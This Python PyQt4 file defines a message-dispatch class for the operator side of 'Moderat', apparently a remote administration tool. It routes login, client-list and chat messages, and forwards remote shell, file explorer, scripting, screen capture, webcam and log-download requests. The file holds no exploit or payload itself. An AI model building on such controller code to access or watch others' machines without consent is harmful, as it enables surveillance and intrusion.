from PyQt4.QtCore import *

from libs.moderat import Clients
from libs.dialogs import message


class Modes:
    def __init__(self, moderat):
        self.moderat = moderat
        self.clients = Clients.Clients(self.moderat)

        self.moderat.notes = {}

        # Create Tables UI
        self.tables = self.moderat.tables

        # Init Modes
        self.modes = {
            'connectSuccess': self.onViewerConnected,
            'moderatorInitializing': self.moderatorInitializing,
            'getClients': self.getClients,
            'getModerators': self.getModerators,
            'getNote': self.signal,
            'shellMode': self.signal,
            'explorerMode': self.signal,
            'scriptingMode': self.signal,
            'getScreen': self.signal,
            'getWebcam': self.signal,
            'countData': self.signal,
            'downloadLogs': self.signal,
            'downloadLog': self.signal,
            'p2pMode': self.p2pMode,
        }

    def check_mode(self, data):
        if type(data) is dict:
            if self.modes.has_key(data['mode']):
                self.modes[data['mode']](data)
            else:
                message.error(self.moderat, self.moderat.MString('MSGBOX_ERROR'), u'{} [{}]'.format(self.moderat.MString('UNKNOWN_MODE'), data['mode']))

    def p2pMode(self, data):
        if data['payload'] == 'p2pNotStarted':
            message.error(self.moderat, self.moderat.MString('MSGBOX_ERROR'), self.moderat.MString('P2P_ERROR'))

    def onViewerConnected(self, data):
        '''
        On Moderat Connected To Server
        :param data:
        :return:
        '''
        pass

    # Moderator Login Callback
    def moderatorInitializing(self, data):
        '''
        Initializing Moderator
        :param data:
        :return:
        '''
        if data['payload'].startswith('loginSuccess '):
            self.moderat.onlineLoading.show()
            # Get Privileges
            self.moderat.privs = int(data['payload'].split()[-1])
            self.moderat.ui.enable_administrator() if self.moderat.privs == 1 else self.moderat.ui.disable_administrator()

            # Start Client Checker
            self.moderat.clients_checker = QTimer()
            self.moderat.clients_checker.timeout.connect(self.moderat.check_clients)
            self.moderat.clients_checker.start(5000)
            if self.moderat.privs:
                self.moderat.moderators_checker = QTimer()
                self.moderat.moderators_checker.timeout.connect(self.moderat.get_moderators)
                self.moderat.moderators_checker.start(5000)

            # Update UI
            self.moderat.ui.on_moderator_connected()
            self.moderat.tray.info(self.moderat.MString('TRAY_CONNECTED'),
                                   u'{} {}:{}'.format(self.moderat.MString('TRAY_CONNECTED_TO'),
                                                      self.moderat.settings.serverIpAddress,
                                                      self.moderat.settings.serverPort))
        else:
            # Update UI
            self.moderat.ui.on_moderator_not_connected()
            self.moderat.tray.warning(self.moderat.MString('TRAY_NOT_CONNECTED'),
                                      u'{} {}:{}'.format(self.moderat.MString('TRAY_CONNECTED_TO'),
                                                         self.moderat.settings.serverIpAddress,
                                                         self.moderat.settings.serverPort))
            self.moderat.username = None
            # Warn Message
            message.error(self.moderat, self.moderat.MString('INCORRECT_CREDENTIALS'), self.moderat.MString('INCORRECT_CREDENTIALS'))

    def signal(self, data):
        '''
        :param data:
        :return:
        '''
        self.moderat.send_signal(data)

    def getClients(self, data):
        '''
        Update Clients Information
        :param data:
        :return:
        '''
        self.clients.store_clients(data['payload'])
        self.tables.update_clients(data)
        self.moderat.onlineLoading.hide()

    # Administrators Modes
    def getModerators(self, data):
        '''
        Update Moderators Information
        :param data:
        :return:
        '''
        self.tables.update_moderators(data)

    def chatMode(self, data):
        '''
        Chat Handler
        :return:
        '''
        self.moderat.new_message(data)
